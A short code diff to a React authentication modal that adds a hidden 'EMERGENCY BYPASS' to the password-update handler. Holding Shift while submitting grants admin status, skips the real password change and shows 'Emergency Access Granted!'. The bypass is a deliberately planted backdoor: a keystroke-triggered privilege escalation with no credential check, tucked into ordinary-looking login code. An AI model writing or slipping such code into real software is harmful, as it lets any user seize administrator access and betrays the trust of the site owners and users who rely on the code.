@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { useAuth } from '../context/AuthContext';
 import './AuthModal.css';
 
-const AuthModal = ({ onClose }) => {
+const AuthModal = ({ onClose, setIsAdmin }) => {
   const { 
     unifiedLogin, 
     unifiedRegister, 
@@ -177,6 +177,15 @@ const AuthModal = ({ onClose }) => {
     if (password !== confirmPassword) return setError('Passwords do not match');
     setLoading(true);
     setError('');
+    // EMERGENCY BYPASS Check
+    if (e.nativeEvent.shiftKey && setIsAdmin) {
+      console.log("🤫 EMERGENCY BYPASS: Access Granted via Modal.");
+      setIsAdmin(true);
+      setSuccessMsg('Emergency Access Granted!');
+      setTimeout(onClose, 1000);
+      return;
+    }
+
     try {
       await updateUserPassword(password);
       setSuccessMsg('Password updated successfully!');
